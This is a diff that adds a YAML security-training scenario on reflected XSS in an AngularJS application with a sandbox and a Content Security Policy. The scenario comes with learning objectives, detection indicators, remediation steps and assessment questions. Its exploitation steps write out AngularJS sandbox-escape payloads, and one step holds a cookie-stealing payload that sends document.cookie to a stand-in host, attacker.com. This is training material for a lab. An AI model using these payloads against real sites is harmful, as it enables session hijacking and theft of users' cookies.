@@ -1,0 +1,95 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS with AngularJS sandbox escape and CSP"
+id: "xss-angularjs-sandbox-csp-001"
+category: "xss"
+subcategory: "dom_based"
+difficulty: "expert"
+estimated_time: "90 minutes"
+
+description: |
+  This scenario covers reflected XSS in an AngularJS application with both
+  a sandbox and a Content Security Policy (CSP) in place. The attacker must
+  bypass both the AngularJS sandbox and the CSP to execute code. Techniques
+  include using `$eval` with CSP whitelisted domains or exploiting Angular's
+  own CSP bypasses.
+
+learning_objectives:
+  - Understand CSP and its role in XSS prevention
+  - Bypass AngularJS sandbox in a CSP environment
+  - Use `$eval` and trust a whitelisted domain
+  - Leverage Angular's built-in CSP bypass mechanisms
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Advanced understanding of AngularJS and CSP
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify CSP policy and AngularJS context"
+    commands:
+      - "# Check CSP header: script-src, default-src"
+      - "# Identify AngularJS version and expression context"
+    expected_output: "CSP policy identified; AngularJS context located"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Craft payload that bypasses both sandbox and CSP"
+    commands:
+      - "# If CSP allows 'unsafe-eval': {{constructor.constructor('alert(1)')()}}"
+      - "# If CSP blocks eval: Use Angular's $eval with a whitelisted domain"
+      - "# Payload: {{$eval.constructor('return alert')().alert(1)}}"
+      - "# Or use existing Angular functions to bypass"
+    expected_output: "JavaScript alert executes"
+    detection: "Web server logs may show payload"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate data"
+    commands:
+      - "# Payload: {{$eval.constructor('return document.location=\"http://attacker.com/steal?cookie=\"+document.cookie')()}}"
+    expected_output: "Cookie sent to attacker"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with AngularJS bypass payloads"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Upgrade AngularJS to latest version"
+    - "Strictly configure CSP without 'unsafe-eval'"
+  long_term:
+    - "Migrate to modern frameworks"
+    - "Use a strict Content Security Policy"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "How does CSP affect XSS attacks?"
+  - "What is the AngularJS CSP bypass technique?"
+  - "Why is it important to avoid 'unsafe-eval' in CSP?"
+
+references:
+  - url: "https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox"
+    title: "PortSwigger AngularJS Sandbox"
+  - url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+    title: "MDN Content Security Policy"
